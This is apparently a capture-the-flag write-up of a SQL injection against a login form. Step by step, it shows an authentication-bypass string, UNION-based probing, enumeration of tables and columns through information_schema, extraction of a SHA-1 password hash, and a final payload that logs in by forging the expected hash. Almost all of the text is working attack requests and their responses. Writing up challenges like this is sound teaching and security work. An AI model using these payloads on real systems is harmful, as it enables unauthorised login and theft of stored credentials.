```
username=admin' or '1 &password=a
```
```
Wrong password for impossibletoguess.
```
The input have been escaped since it returned impossibletoguess. We can assume that if the query is true, it return impossibletoguess.
Test to find the columns:
```
username=admin'union select null,null-- &password=a -> return True
```
Extract Data:
```
username=admin'union select version(),null-- &password=a
```
```
Wrong password for 8.0.28-0ubuntu0.20.04.3.
```
Find Tables Name:
```
username=admin'union select table_name,null from information_schema.tables-- &password=a
```
```
Wrong password for users.
```
Find Columns Name:
```
username=admin'union select column_name,null from information_schema.columns where table_name = "users"-- &password=a
```
```
Wrong password for username.
Wrong password for password.
```
Extract Password:
```
username=admin'union select password,null from users-- &password=a
```
```
Wrong password for 1b2f190ad705d7c2afcac45447a31b053fada0c4. -> Encrypted using SHA-1
```
Final Payload:
```
username=admin'union select username, sha('1b2f190ad705d7c2afcac45447a31b053fada0c4') from users-- &password=1b2f190ad705d7c2afcac45447a31b053fada0c4
```
